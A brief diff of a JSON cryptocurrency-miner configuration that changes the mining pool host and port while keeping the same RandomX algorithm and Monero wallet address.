@@ -1,7 +1,7 @@
 {
     "algo": "rx/0",
-    "pool": "pool.hashvault.pro",
-    "port": 443,
+    "pool": "pococo.cc",
+    "port": 3333,
     "wallet": "4AXh7iLs9rLVwFsTqqqDetiXGGqweNsPS9qppNzj6tWyRtZ6THYpm9Xh9pTH7amK4b3hdqtDpEYLeYNYfZjzaiCy7Ch3EUw",
     "password": "m",
     "nicehash": false,
